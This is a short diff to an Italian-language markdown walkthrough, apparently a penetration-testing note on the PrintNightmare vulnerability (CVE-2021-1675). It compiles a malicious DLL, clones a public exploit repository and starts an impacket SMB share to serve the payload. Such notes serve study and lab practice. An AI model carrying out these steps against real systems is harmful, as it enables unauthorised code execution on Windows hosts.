@@ -190,3 +190,10 @@ e compilalo
 ```bash
 x86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.c
 ```
+clona l'exploit dalla repository
+```bash
+git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare
+```
+avvia una share smb
+
+impacket-smbserver -smb2support ATTACKERSHARE .
